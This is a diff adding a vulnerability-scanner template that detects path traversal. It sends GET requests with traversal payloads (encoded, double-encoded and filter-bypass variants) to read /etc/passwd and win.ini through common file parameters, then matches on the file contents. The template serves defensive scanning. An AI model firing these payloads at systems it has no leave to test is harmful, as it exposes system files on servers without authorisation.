@@ -1,0 +1,45 @@
+id: whai-path-traversal
+
+info:
+  name: Path Traversal Detection
+  author: whitehat-ai
+  severity: high
+  description: Detects path traversal vulnerabilities in file download and include parameters
+  tags: path-traversal,lfi,file-inclusion
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=../../../etc/passwd"
+      - "{{BaseURL}}/?path=../../../etc/passwd"
+      - "{{BaseURL}}/?page=../../../etc/passwd"
+      - "{{BaseURL}}/?include=../../../etc/passwd"
+      - "{{BaseURL}}/?doc=../../../etc/passwd"
+      - "{{BaseURL}}/?template=../../../etc/passwd"
+      - "{{BaseURL}}/?filename=../../../etc/passwd"
+      - "{{BaseURL}}/?download=../../../etc/passwd"
+      - "{{BaseURL}}/?read=../../../etc/passwd"
+      - "{{BaseURL}}/?load=../../../etc/passwd"
+      - "{{BaseURL}}/?file=....//....//....//etc/passwd"
+      - "{{BaseURL}}/?file=..%2f..%2f..%2fetc%2fpasswd"
+      - "{{BaseURL}}/?file=..%252f..%252f..%252fetc%252fpasswd"
+      - "{{BaseURL}}/?file=/etc/passwd"
+      - "{{BaseURL}}/?file=..\\..\\..\\windows\\win.ini"
+      - "{{BaseURL}}/?file=....\\\\....\\\\....\\\\windows\\win.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[fonts\\]"
+          - "\\[extensions\\]"
+          - "for 16-bit app support"
+        condition: or
